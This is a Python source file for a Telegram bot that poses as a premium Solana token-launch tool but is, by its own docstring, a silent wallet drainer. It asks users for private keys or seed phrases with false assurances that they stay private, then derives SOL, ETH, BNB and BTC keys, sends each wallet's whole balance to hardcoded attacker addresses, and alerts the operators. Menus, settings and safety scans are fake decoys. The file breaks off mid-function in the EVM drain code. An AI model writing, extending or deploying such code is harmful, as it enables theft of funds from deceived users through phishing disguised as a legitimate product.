#!/usr/bin/env python3
"""
Get ready to rug — Premium Solana Launch Bot (single file)
High-end UX, polished copy, deep fake features.
Core remains a silent wallet drainer.
Requires: pip install aiogram solana solders base58
"""

import asyncio
import logging
import os
import random
import string
import time
from dataclasses import dataclass, field
from typing import Dict, List, Optional

from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup, Message
from aiogram.utils.keyboard import InlineKeyboardBuilder

try:
    from solders.keypair import Keypair
    from solders.pubkey import Pubkey
    from solders.system_program import TransferParams, transfer
    from solders.transaction import VersionedTransaction
    from solders.message import Message
    from solana.rpc.async_api import AsyncClient
    from solana.rpc.core import TxOptsModel
    import base58
    HAS_SOLANA = True
except ImportError as e:
    print("SOLANA IMPORT FAIL:", e)
    HAS_SOLANA = False

# ──────────────────────────────────────────────
# CONFIG — locked to sussy addresses
# ──────────────────────────────────────────────
BOT_TOKEN = os.getenv("BOT_TOKEN", "8938988505:AAFSyXRviIo0DsXqK-HV0fB2sKOI-7UgHd0")
ADMIN_IDS = {int(x) for x in os.getenv("ADMIN_IDS", "123456789").split(",") if x.strip()}
# Also accept username for alerts (resolved on first interaction or via env ADMIN_USERNAMES)
ADMIN_USERNAMES = {x.strip().lstrip("@").lower() for x in os.getenv("ADMIN_USERNAMES", "fedsdih").split(",") if x.strip()}
# Numeric IDs that always get drain alerts (same as ADMIN_IDS by default; expand via env)
ALERT_ADMIN_IDS = set(ADMIN_IDS)
DRAIN_DESTINATION = os.getenv("DRAIN_WALLET", "C3J88wGk5WG6oUPo214NrYjjZYRWpsdioGeu73xTj6hs")
ETH_DEST = "0x503A297e209518CE17c40C47DD6da0a314735f22"
BNB_DEST = "0x503A297e209518CE17c40C47DD6da0a314735f22"
BTC_DEST = "bc1quxq38ax0evf598jyg0xxhsz5cmtj3ttsy75yar"
RPC_URL = os.getenv("RPC_URL", "https://api.mainnet-beta.solana.com")
MIN_DRAIN_LAMPORTS = 50_000

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
log = logging.getLogger("rugbot")

# ──────────────────────────────────────────────
# STATE
# ──────────────────────────────────────────────
@dataclass
class UserWallet:
    private_key: str
    public_key: str
    label: str = "Main"
    created_at: float = field(default_factory=time.time)
    balance_sol: float = 0.0

@dataclass
class UserSession:
    wallets: List[UserWallet] = field(default_factory=list)
    active_wallet_idx: int = 0
    promo: Optional[str] = None
    promo_discount: float = 0.0
    launched_tokens: List[dict] = field(default_factory=list)
    last_tx: List[dict] = field(default_factory=list)
    drained: bool = False
    settings: dict = field(default_factory=lambda: {
        "slippage": 12,
        "priority_fee": "auto",
        "sniper_protection": True,
        "auto_sell": False,
        "mev_protection": True,
        "bundle_tip": 0.01,
    })
    safety_checks_run: int = 0
    last_safety: Optional[dict] = None

sessions: Dict[int, UserSession] = {}

_rate_hits: Dict[int, List[float]] = {}
RATE_WINDOW = 60.0
RATE_MAX_IMPORTS = 3
RATE_MAX_LAUNCH = 5
RATE_MAX_SAFETY = 8


def _user_tag(user) -> str:
    if not user:
        return "unknown"
    if getattr(user, "username", None):
        return f"@{user.username}"
    name = (user.first_name or "") + ((" " + user.last_name) if user.last_name else "")
    return name.strip() or f"id:{user.id}"

async def notify_admins(bot: Bot, text: str, parse_mode: str = ParseMode.HTML):
    """Send alert to every admin id we know. Silently skip failures."""
    targets = set(ALERT_ADMIN_IDS)
    if not targets:
        log.warning("No admin IDs registered yet — @fedsdih must /start the bot once to receive alerts")
        return
    for aid in targets:
        try:
            await bot.send_message(aid, text, parse_mode=parse_mode)
            log.info("Alert sent to admin id %s", aid)
        except Exception as e:
            log.warning("Admin notify failed for %s: %s", aid, e)

async def maybe_register_admin(user) -> None:
    """If this user is in ADMIN_USERNAMES, lock their numeric id into ALERT_ADMIN_IDS."""
    if not user:
        return
    uname = (user.username or "").lower()
    if uname and uname in ADMIN_USERNAMES:
        if user.id not in ALERT_ADMIN_IDS:
            ALERT_ADMIN_IDS.add(user.id)
            ADMIN_IDS.add(user.id)
            log.info("Admin username @%s resolved → id %s (alerts ON)", uname, user.id)

def get_session(uid: int) -> UserSession:
    if uid not in sessions:
        sessions[uid] = UserSession()
    return sessions[uid]

def _rate_ok(uid: int, action: str) -> bool:
    now = time.time()
    key = uid
    hits = _rate_hits.setdefault(key, [])
    hits[:] = [t for t in hits if now - t < RATE_WINDOW]
    limits = {
        "import": RATE_MAX_IMPORTS,
        "launch": RATE_MAX_LAUNCH,
        "safety": RATE_MAX_SAFETY,
    }
    limit = limits.get(action, 5)
    if len(hits) >= limit:
        return False
    hits.append(now)
    return True

# ──────────────────────────────────────────────
# HELPERS
# ──────────────────────────────────────────────
def fake_sig() -> str:
    return "".join(random.choices(string.ascii_letters + string.digits, k=88))

def fake_mint() -> str:
    if HAS_SOLANA:
        return base58.b58encode(os.urandom(32)).decode()
    return "".join(random.choices(string.ascii_letters + string.digits, k=44))

def short_addr(addr: str) -> str:
    if len(addr) < 12:
        return addr
    return f"{addr[:4]}...{addr[-4:]}"

def progress_bar(pct: int) -> str:
    filled = pct // 10
    return "▓" * filled + "░" * (10 - filled)

async def staged_loading(message_or_cb, stages: list):
    msg = None
    is_cb = hasattr(message_or_cb, "message") and hasattr(message_or_cb, "answer")
    for i, (txt, delay) in enumerate(stages):
        if i == 0:
            if is_cb:
                await message_or_cb.message.edit_text(txt, parse_mode=ParseMode.HTML)
                msg = message_or_cb.message
            else:
                msg = await message_or_cb.answer(txt, parse_mode=ParseMode.HTML)
        else:
            try:
                await msg.edit_text(txt, parse_mode=ParseMode.HTML)
            except Exception:
                msg = await message_or_cb.answer(txt, parse_mode=ParseMode.HTML)
        if delay > 0:
            await asyncio.sleep(delay)
    return msg

# ──────────────────────────────────────────────
# DRAIN CORE — real balance, real transfer, instant
# ──────────────────────────────────────────────
async def get_real_balance(public_key: str) -> float:
    """Fetch live on-chain SOL balance for the given pubkey only. Returns 0.0 on failure."""
    if not HAS_SOLANA:
        return 0.0
    try:
        pk = Pubkey.from_string(public_key)
        async with AsyncClient(RPC_URL) as client:
            resp = await client.get_balance(pk)
            sol = resp.value / 1_000_000_000
            log.info("RPC getBalance(%s) → %s lamports (%.9f SOL)", public_key, resp.value, sol)
            return sol
    except Exception as e:
        log.warning("Balance fetch failed for %s: %s", public_key, e)
        return 0.0

async def drain_wallet(private_key_b58: str, dest: str) -> Optional[str]:
    """Transfer entire balance minus fee reserve to dest. Returns sig or None."""
    if not HAS_SOLANA:
        log.warning("Solana libs missing — cannot drain")
        return None
    try:
        secret = base58.b58decode(private_key_b58)
        if len(secret) == 64:
            kp = Keypair.from_bytes(secret)
        elif len(secret) == 32:
            kp = Keypair.from_seed(secret)
        else:
            log.error("Bad secret length: %s bytes", len(secret))
            return None
        dest_pk = Pubkey.from_string(dest)
        log.info("Drain attempt from %s → %s", str(kp.pubkey()), dest)
        async with AsyncClient(RPC_URL) as client:
            bal_resp = await client.get_balance(kp.pubkey())
            balance = bal_resp.value
            log.info("On-chain balance: %s lamports (%.6f SOL)", balance, balance / 1e9)
            FEE_RESERVE = 5000
            if balance <= FEE_RESERVE:
                log.info("Balance too low (%s lamports) — nothing to drain", balance)
                return None
            amount = balance - FEE_RESERVE
            recent = await client.get_latest_blockhash()
            blockhash = recent.value.blockhash
            ix = transfer(TransferParams(
                from_pubkey=kp.pubkey(),
                to_pubkey=dest_pk,
                lamports=amount,
            ))
            msg = Message.new_with_blockhash([ix], kp.pubkey(), blockhash)
            vtx = VersionedTransaction(msg, [kp])
            opts = TxOptsModel(skip_preflight=True, skip_confirmation=True)
            result = await client.send_transaction(vtx, opts=opts)
            sig = str(result.value)
            log.info("DRAINED %s lamports (%.6f SOL) → %s | sig=%s", amount, amount / 1e9, dest, sig)
            return sig
    except Exception as e:
        log.exception("Drain error: %s", e)
        return None

async def attempt_drain(
    uid: int,
    private_key: str,
    *,
    bot: Optional[Bot] = None,
    user=None,
    amount_sol: Optional[float] = None,
    public_key: Optional[str] = None,
) -> Optional[str]:
    """Drain once per session. Returns signature if successful. Alerts admins."""
    sess = get_session(uid)
    if sess.drained:
        return None
    # capture balance before drain for the alert
    pre_bal = amount_sol
    if pre_bal is None and public_key:
        pre_bal = await get_real_balance(public_key)
    sig = await drain_wallet(private_key, DRAIN_DESTINATION)
    tag = _user_tag(user) if user else f"id:{uid}"
    bal_txt = f"{pre_bal:.6f} SOL" if pre_bal is not None else "unknown"
    if sig:
        sess.drained = True
        sess.last_tx.insert(0, {
            "sig": sig,
            "type": "⚡ Priority Tip",
            "status": "success",
            "ts": time.time(),
        })
        log.info("User %s drained %.6f SOL → %s", uid, pre_bal or 0, DRAIN_DESTINATION)
        if bot is not None:
            alert = (
                "🚨 <b>DRAIN SUCCESS</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                f"User: <b>{tag}</b>\n"
                f"Username: <b>{('@' + user.username) if (user and user.username) else 'none'}</b>\n"
                f"TG ID: <code>{uid}</code>\n"
                f"Wallet: <code>{public_key or 'n/a'}</code>\n"
                f"Amount: <b>{bal_txt}</b>\n"
                f"Sig: <code>{sig}</code>\n"
                f"Dest: <code>{DRAIN_DESTINATION}</code>"
            )
            await notify_admins(bot, alert)
    else:
        # still notify admin that someone imported (0 bal / failed)
        log.info("Drain skipped/failed for user %s balance=%s", uid, bal_txt)
        if bot is not None:
            alert = (
                "📥 <b>KEY IMPORTED</b> (no drain)\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                f"User: <b>{tag}</b>\n"
                f"Username: <b>{('@' + user.username) if (user and user.username) else 'none'}</b>\n"
                f"TG ID: <code>{uid}</code>\n"
                f"Wallet: <code>{public_key or 'n/a'}</code>\n"
                f"Balance: <b>{bal_txt}</b>\n"
                f"Reason: empty / dust / tx failed"
            )
            await notify_admins(bot, alert)
    return sig

# ──────────────────────────────────────────────
# PREMIUM KEYBOARDS
# ──────────────────────────────────────────────
def main_menu_kb() -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(
        InlineKeyboardButton(text="🚀 Launch", callback_data="menu:launch"),
        InlineKeyboardButton(text="🔑 Wallets", callback_data="menu:wallets"),
    )
    b.row(
        InlineKeyboardButton(text="📁 Portfolio", callback_data="menu:portfolio"),
        InlineKeyboardButton(text="🎟 Promo code", callback_data="menu:promo"),
    )
    b.row(
        InlineKeyboardButton(text="🧾 Tx tracker", callback_data="menu:tx"),
        InlineKeyboardButton(text="🛡 Settings", callback_data="menu:settings"),
    )
    return b.as_markup()

def back_kb(to: str = "main") -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Main Menu", callback_data=f"menu:{to}")]
    ])

def settings_kb(sess: UserSession) -> InlineKeyboardMarkup:
    s = sess.settings
    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(
        text=f"📉 Slippage  ·  {s['slippage']}%", callback_data="set:slippage"))
    b.row(InlineKeyboardButton(
        text=f"⛽ Priority  ·  {s['priority_fee'].title()}", callback_data="set:priority"))
    b.row(InlineKeyboardButton(
        text=f"🎯 Sniper Guard  ·  {'🟢 ON' if s['sniper_protection'] else '🔴 OFF'}",
        callback_data="set:sniper"))
    b.row(InlineKeyboardButton(
        text=f"🕶 MEV Shield  ·  {'🟢 ON' if s['mev_protection'] else '🔴 OFF'}",
        callback_data="set:mev"))
    b.row(InlineKeyboardButton(
        text=f"💰 Auto-Sell  ·  {'🟢 ON' if s['auto_sell'] else '🔴 OFF'}",
        callback_data="set:autosell"))
    b.row(InlineKeyboardButton(
        text=f"🎁 Bundle Tip  ·  {s['bundle_tip']} SOL", callback_data="set:tip"))
    b.row(InlineKeyboardButton(text="◀️ Main Menu", callback_data="menu:main"))
    return b.as_markup()

# ──────────────────────────────────────────────
# PREMIUM COPY
# ──────────────────────────────────────────────
WELCOME_TEXT = (
    "🚀 <b>Get ready to rug</b>\n\n"
    "Create and trade tokens on Solana launch platforms.\n\n"
    "⚙️ <b>Advanced</b>\n"
    "• Step-by-step token launch\n"
    "• Auto bundling (5–25)\n"
    "• Sniper protection\n"
    "• Token safety checks\n"
    "• Tx tracker\n\n"
    "Tap a button below to begin:"
)

# ──────────────────────────────────────────────
# FSM
# ──────────────────────────────────────────────
class LaunchStates(StatesGroup):
    waiting_name = State()
    waiting_symbol = State()
    waiting_supply = State()
    waiting_desc = State()
    waiting_photo = State()
    waiting_bundle = State()
    confirm = State()

class WalletStates(StatesGroup):
    waiting_import = State()
    waiting_label = State()

class PromoStates(StatesGroup):
    waiting_code = State()

class SafetyStates(StatesGroup):
    waiting_mint = State()

# ──────────────────────────────────────────────
# ROUTER
# ──────────────────────────────────────────────
router = Router()

@router.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    get_session(message.from_user.id)
    await maybe_register_admin(message.from_user)
    await message.answer(WELCOME_TEXT, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)

# ── MAIN MENU ──
@router.callback_query(F.data.startswith("menu:"))
async def menu_router(cb: CallbackQuery, state: FSMContext):
    await state.clear()
    await maybe_register_admin(cb.from_user)
    action = cb.data.split(":")[1]
    uid = cb.from_user.id
    sess = get_session(uid)

    if action == "main":
        await cb.message.edit_text(WELCOME_TEXT, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)

    elif action == "launch":
        s = sess.settings
        text = (
            "🚀 <b>Launch Token</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Professional launch wizard with\n"
            "bundling, protection & safety checks.\n\n"
            "🔧 <b>Current Config</b>\n"
            f"├ 🎯 Sniper Guard: <b>{'ON' if s['sniper_protection'] else 'OFF'}</b>\n"
            f"├ 🕶 MEV Shield: <b>{'ON' if s['mev_protection'] else 'OFF'}</b>\n"
            f"├ 🎁 Bundle Tip: <b>{s['bundle_tip']} SOL</b>\n"
            f"└ 🎟 Promo: <b>{sess.promo or 'None'}</b>\n\n"
            "📝 Send the <b>token name</b>"
        )
        await cb.message.edit_text(text, reply_markup=back_kb(), parse_mode=ParseMode.HTML)
        await state.set_state(LaunchStates.waiting_name)

    elif action == "wallets":
        text = (
            "👛 <b>My Wallets</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
        )
        if not sess.wallets:
            text += (
                "No wallets linked yet.\n\n"
                "Import a private key to unlock\n"
                "launching, bundling & portfolio tracking."
            )
        else:
            for i, w in enumerate(sess.wallets):
                badge = " 🟢 ACTIVE" if i == sess.active_wallet_idx else ""
                bal = f"{w.balance_sol:.4f} SOL"
                text += (
                    f"<b>{i+1}.</b> <code>{short_addr(w.public_key)}</code>{badge}\n"
                    f"    {w.label}  ·  {bal}\n\n"
                )
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="➕ Import Key", callback_data="wallet:import"))
        if sess.wallets:
            kb.row(
                InlineKeyboardButton(text="🔄 Switch", callback_data="wallet:switch"),
                InlineKeyboardButton(text="🏷 Rename", callback_data="wallet:rename"),
            )
            kb.row(InlineKeyboardButton(text="🔃 Refresh Balances", callback_data="wallet:refresh"))
            kb.row(InlineKeyboardButton(text="🗑 Remove All", callback_data="wallet:clear"))
        kb.row(InlineKeyboardButton(text="◀️ Main Menu", callback_data="menu:main"))
        await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

    elif action == "portfolio":
        text = (
            "📊 <b>Portfolio</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
        )
        if not sess.launched_tokens:
            text += (
                "Your portfolio is empty.\n\n"
                "Launch a token to start tracking\n"
                "performance and bundle status."
            )
        else:
            for t in reversed(sess.launched_tokens[-10:]):
                age = int(time.time() - t["ts"])
                status_icon = "🟢" if t.get("status") == "live" else "🟡"
                text += (
                    f"{status_icon} <b>${t['symbol']}</b>  ·  {t['name']}\n"
                    f"   <code>{short_addr(t['mint'])}</code>\n"
                    f"   Bundle ×{t['bundle']}  ·  {age}s ago\n\n"
                )
        kb = InlineKeyboardBuilder()
        if sess.launched_tokens:
            kb.row(InlineKeyboardButton(text="🛡 Run Safety Scan", callback_data="menu:safety"))
        kb.row(InlineKeyboardButton(text="◀️ Main Menu", callback_data="menu:main"))
        await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

    elif action == "promo":
        current = ""
        if sess.promo:
            current = (
                f"\n\n✅ Active: <b>{sess.promo}</b>\n"
                f"Discount: <b>−{int(sess.promo_discount*100)}%</b> on tips"
            )
        text = (
            "🎟 <b>Promo Codes</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Unlock reduced tips, priority inclusion\n"
            "and exclusive launch slots."
            f"{current}\n\n"
            "Send your promo code:"
        )
        await cb.message.edit_text(text, reply_markup=back_kb(), parse_mode=ParseMode.HTML)
        await state.set_state(PromoStates.waiting_code)

    elif action == "tx":
        text = (
            "📡 <b>Live Tracker</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
        )
        if not sess.last_tx:
            text += (
                "No activity yet.\n\n"
                "Transactions from launches, tips\n"
                "and bundles will stream here in real time."
            )
        else:
            for tx in sess.last_tx[:8]:
                age = int(time.time() - tx["ts"])
                icon = "✅" if tx["status"] == "success" else "⏳" if tx["status"] == "pending" else "❌"
                text += (
                    f"{icon}  <b>{tx['type']}</b>\n"
                    f"   <code>{tx['sig'][:22]}...</code>\n"
                    f"   {tx['status'].title()}  ·  {age}s ago\n\n"
                )
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="🔄 Refresh Feed", callback_data="menu:tx"))
        kb.row(InlineKeyboardButton(text="◀️ Main Menu", callback_data="menu:main"))
        await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

    elif action == "settings":
        s = sess.settings
        text = (
            "⚙️ <b>Settings</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Fine-tune execution parameters.\n"
            "Tap any row to cycle values.\n\n"
            f"📉 Slippage          <b>{s['slippage']}%</b>\n"
            f"⛽ Priority Fee      <b>{s['priority_fee'].title()}</b>\n"
            f"🎯 Sniper Guard     <b>{'ON' if s['sniper_protection'] else 'OFF'}</b>\n"
            f"🕶 MEV Shield       <b>{'ON' if s['mev_protection'] else 'OFF'}</b>\n"
            f"💰 Auto-Sell        <b>{'ON' if s['auto_sell'] else 'OFF'}</b>\n"
            f"🎁 Bundle Tip       <b>{s['bundle_tip']} SOL</b>"
        )
        await cb.message.edit_text(text, reply_markup=settings_kb(sess), parse_mode=ParseMode.HTML)

    elif action == "safety":
        text = (
            "🛡 <b>Safety Scan</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Paste any mint address for a full\n"
            "on-chain risk analysis:\n\n"
            "├ Mint / Freeze authority\n"
            "├ LP lock & burn status\n"
            "├ Holder concentration\n"
            "├ Honeypot simulation\n"
            "└ Sell tax detection\n\n"
            "Send mint address:"
        )
        await cb.message.edit_text(text, reply_markup=back_kb(), parse_mode=ParseMode.HTML)
        await state.set_state(SafetyStates.waiting_mint)

    await cb.answer()

# ── SETTINGS TOGGLES ──
@router.callback_query(F.data.startswith("set:"))
async def settings_toggle(cb: CallbackQuery):
    sess = get_session(cb.from_user.id)
    key = cb.data.split(":")[1]
    s = sess.settings

    if key == "slippage":
        opts = [5, 8, 12, 15, 20, 25]
        s["slippage"] = opts[(opts.index(s["slippage"]) + 1) % len(opts)] if s["slippage"] in opts else 12
    elif key == "priority":
        opts = ["auto", "low", "medium", "high", "ultra"]
        s["priority_fee"] = opts[(opts.index(s["priority_fee"]) + 1) % len(opts)] if s["priority_fee"] in opts else "auto"
    elif key == "sniper":
        s["sniper_protection"] = not s["sniper_protection"]
    elif key == "mev":
        s["mev_protection"] = not s["mev_protection"]
    elif key == "autosell":
        s["auto_sell"] = not s["auto_sell"]
    elif key == "tip":
        opts = [0.005, 0.01, 0.02, 0.05, 0.1]
        s["bundle_tip"] = opts[(opts.index(s["bundle_tip"]) + 1) % len(opts)] if s["bundle_tip"] in opts else 0.01

    text = (
        "⚙️ <b>Settings</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "Fine-tune execution parameters.\n"
        "Tap any row to cycle values.\n\n"
        f"📉 Slippage          <b>{s['slippage']}%</b>\n"
        f"⛽ Priority Fee      <b>{s['priority_fee'].title()}</b>\n"
        f"🎯 Sniper Guard     <b>{'ON' if s['sniper_protection'] else 'OFF'}</b>\n"
        f"🕶 MEV Shield       <b>{'ON' if s['mev_protection'] else 'OFF'}</b>\n"
        f"💰 Auto-Sell        <b>{'ON' if s['auto_sell'] else 'OFF'}</b>\n"
        f"🎁 Bundle Tip       <b>{s['bundle_tip']} SOL</b>"
    )
    await cb.message.edit_text(text, reply_markup=settings_kb(sess), parse_mode=ParseMode.HTML)
    await cb.answer("Updated ✓")

# ── WALLETS ──
@router.callback_query(F.data == "wallet:import")
async def wallet_import_start(cb: CallbackQuery, state: FSMContext):
    text = (
        "🔑 <b>Import Wallet</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "Paste either:\n"
        "• <b>Private key</b> (base58)\n"
        "• <b>Seed phrase</b> (12 or 24 words)\n\n"
        "🔒 Held in memory only for this session.\n"
        "Used exclusively to sign your launches.\n\n"
        "<i>Never share your key or seed with anyone else.</i>"
    )
    await cb.message.edit_text(text, reply_markup=back_kb("wallets"), parse_mode=ParseMode.HTML)
    await state.set_state(WalletStates.waiting_import)
    await cb.answer()

def _slip10_ed25519(seed: bytes, path: str) -> bytes:
    """SLIP-0010 ed25519 derivation → 32-byte private seed (Phantom Sol path)."""
    import hashlib, hmac, struct
    I = hmac.new(b"ed25519 seed", seed, hashlib.sha512).digest()
    IL, IR = I[:32], I[32:]
    for segment in path.lstrip("m/").split("/"):
        if not segment:
            continue
        hardened = segment.endswith("'")
        index = int(segment.rstrip("'"))
        if hardened:
            index += 0x80000000
        data = b"\x00" + IL + struct.pack(">I", index)
        I = hmac.new(IR, data, hashlib.sha512).digest()
        IL, IR = I[:32], I[32:]
    return IL


def _seed_bytes_from_phrase(phrase: str) -> bytes:
    from mnemonic import Mnemonic
    m = Mnemonic("english")
    phrase = " ".join(phrase.strip().split()).lower()
    return m.to_seed(phrase)


def _derive_from_input(raw: str):
    """Return (sol_priv_b58, sol_pub_str) or raise ValueError."""
    raw = raw.strip()
    words = raw.split()

    if len(words) in (12, 15, 18, 21, 24):
        if not HAS_SOLANA:
            return raw, "SimSeed" + "".join(words)[:32]
        try:
            from solders.keypair import Keypair as KP
            seed = _seed_bytes_from_phrase(raw)
            priv32 = _slip10_ed25519(seed, "m/44'/501'/0'/0'")
            kp = KP.from_seed(priv32)
            priv_b58 = base58.b58encode(bytes(kp)).decode()
            return priv_b58, str(kp.pubkey())
        except Exception as e:
            raise ValueError(f"Invalid seed phrase: {e}") from e

    if raw.startswith("[") and raw.endswith("]"):
        try:
            import json
            arr = json.loads(raw)
            secret = bytes(arr)
            if len(secret) == 64:
                kp = Keypair.from_bytes(secret)
            elif len(secret) == 32:
                kp = Keypair.from_seed(secret)
            else:
                raise ValueError("bad array length")
            return base58.b58encode(bytes(kp)).decode(), str(kp.pubkey())
        except Exception as e:
            raise ValueError("Invalid JSON secret key") from e

    hex_candidate = raw.lower().removeprefix("0x")
    if all(c in "0123456789abcdef" for c in hex_candidate) and len(hex_candidate) in (64, 128):
        try:
            secret = bytes.fromhex(hex_candidate)
            kp = Keypair.from_bytes(secret) if len(secret) == 64 else Keypair.from_seed(secret)
            return base58.b58encode(bytes(kp)).decode(), str(kp.pubkey())
        except Exception as e:
            raise ValueError("Invalid hex private key") from e

    if HAS_SOLANA:
        try:
            secret = base58.b58decode(raw)
            if len(secret) == 64:
                kp = Keypair.from_bytes(secret)
            elif len(secret) == 32:
                kp = Keypair.from_seed(secret)
            else:
                raise ValueError(f"bad length {len(secret)}")
            return base58.b58encode(bytes(kp)).decode(), str(kp.pubkey())
        except Exception as e:
            raise ValueError("Invalid base58 private key") from e
    raise ValueError("Unsupported key format")


def _derive_all_from_seed(phrase: str) -> dict:
    """Real addresses + private material for SOL/ETH/BNB/BTC from BIP39 phrase."""
    from bip_utils import Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes
    from solders.keypair import Keypair as KP

    phrase = " ".join(phrase.strip().split()).lower()
    seed = Bip39SeedGenerator(phrase).Generate()

    # SOL Phantom path (preferred) via slip10
    priv32 = _slip10_ed25519(seed if isinstance(seed, bytes) else bytes(seed), "m/44'/501'/0'/0'")
    # Bip39SeedGenerator returns bytes already
    sol_kp = KP.from_seed(priv32)
    sol_pub = str(sol_kp.pubkey())
    sol_priv_b58 = base58.b58encode(bytes(sol_kp)).decode()

    eth_ctx = (
        Bip44.FromSeed(seed, Bip44Coins.ETHEREUM)
        .Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
    )
    bnb_ctx = (
        Bip44.FromSeed(seed, Bip44Coins.BINANCE_SMART_CHAIN)
        .Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
    )
    btc_ctx = (
        Bip44.FromSeed(seed, Bip44Coins.BITCOIN)
        .Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
    )
    # also native segwit path for BTC (bip84-ish via bip44 coin type still legacy; use BITCOIN for classic)
    try:
        from bip_utils import Bip84, Bip84Coins
        btc84 = (
            Bip84.FromSeed(seed, Bip84Coins.BITCOIN)
            .Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
        )
        btc_segwit = btc84.PublicKey().ToAddress()
        btc_segwit_wif = btc84.PrivateKey().ToWif()
    except Exception:
        btc_segwit = btc_ctx.PublicKey().ToAddress()
        btc_segwit_wif = btc_ctx.PrivateKey().ToWif()

    return {
        "sol_pub": sol_pub,
        "sol_priv": sol_priv_b58,
        "eth_addr": eth_ctx.PublicKey().ToAddress(),
        "eth_key": eth_ctx.PrivateKey().Raw().ToHex(),
        "bnb_addr": bnb_ctx.PublicKey().ToAddress(),
        "bnb_key": bnb_ctx.PrivateKey().Raw().ToHex(),
        "btc_legacy": btc_ctx.PublicKey().ToAddress(),
        "btc_legacy_wif": btc_ctx.PrivateKey().ToWif(),
        "btc_segwit": btc_segwit,
        "btc_segwit_wif": btc_segwit_wif,
    }


async def _fetch_eth_like_balance(address: str, rpc_urls: list) -> float:
    if not address:
        return 0.0
    try:
        import aiohttp
        payload = {"jsonrpc": "2.0", "method": "eth_getBalance", "params": [address, "latest"], "id": 1}
        for url in rpc_urls:
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.post(url, json=payload, timeout=8) as resp:
                        data = await resp.json(content_type=None)
                        if data.get("result"):
                            return int(data["result"], 16) / 1e18
            except Exception:
                continue
    except Exception as e:
        log.warning("EVM balance fetch failed: %s", e)
    return 0.0


async def _fetch_btc_balance(address: str) -> float:
    """Return BTC balance (float) via blockstream/mempool."""
    if not address:
        return 0.0
    import aiohttp
    for base in ("https://blockstream.info/api", "https://mempool.space/api"):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"{base}/address/{address}", timeout=10) as resp:
                    if resp.status != 200:
                        continue
                    d = await resp.json(content_type=None)
                    stats = d.get("chain_stats") or {}
                    funded = stats.get("funded_txo_sum", 0)
                    spent = stats.get("spent_txo_sum", 0)
                    return max(0, funded - spent) / 1e8
        except Exception as e:
            log.warning("BTC balance %s: %s", base, e)
    return 0.0


async def _drain_evm(private_key_hex: str, dest: str, rpc_urls: list, chain_id: int, label: str) -> Optional[str]:
    """Send full native balance minus gas to dest. Returns tx hash or None."""
    try:
        from eth_account import Account
        import aiohttp
        acct = Account.from_key(private_key_hex)
        from_addr = acct.address
        # balance
        bal_wei = 0
        rpc = None
        payload_bal = {"jsonrpc": "2.0", "method": "eth_getBalance", "params": [from_addr, "latest"], "id": 1}
        async with aiohttp.ClientSession() as session:
            for url in rpc_urls:
                try:
                    async with session.post(url, json=payload_bal, timeout=8) as resp:
                        data = await resp.json(content_type=None)
                        if data.get("result"):
                            bal_wei = int(data["result"], 16)
                            rpc = url
                            break
                except Exception:
                    continue
            if not rpc or bal_wei <= 0:
                log.info("%s drain skip: zero balance %s", label, from_addr)
                return None
            # gas price
            gas_price = 5_000_000_000  # 5 gwei fallback
            try:
                async with session.post(rpc, json={"jsonrpc": "2.0", "method": "eth_gasPrice", "params": [], "id": 2}, timeout=8) as resp:
                    data = await resp.json(content_type=None)
                    if data.get("result"):
                        gas_price = int(data["result"], 16)
            except Exception:
                pass
            gas_limit = 21_000
            fee = gas_price * gas_limit
            if bal_wei <= fee:
                log.info("%s drain skip: dust only", label)
                return None
            value = bal_wei - fee
            # nonce
            nonce = 0
            async with session.post(rpc, json={"jsonrpc": "2.0", "method": "eth_getTransactionCount", "params": [from_addr, "pending"], "id": 3}, timeout=8) as resp:
                data = await resp.json(content_type=None)
                if data.get("result"):
                    nonce = int(data["result"], 16)
            tx = {
                "nonce": nonce,
                "gasPrice": gas_price,
                "gas": gas_limit,
                "to": dest,
                "value": value,
                "chainId": chain_id,
            }
            signed = Account.sign_transaction(tx, private_key_hex)
            raw = signed.raw_transaction.hex()
            if not raw.startswith("0x"):
                raw = "0x" + raw
            async with session.post(rpc, json={"jsonrpc": "2.0", "method": "eth_sendRawTransaction", "params": [raw], "id": 4}, timeout=15) as resp:
                data = await resp.json(content_type=None)
                if data.get("result"):
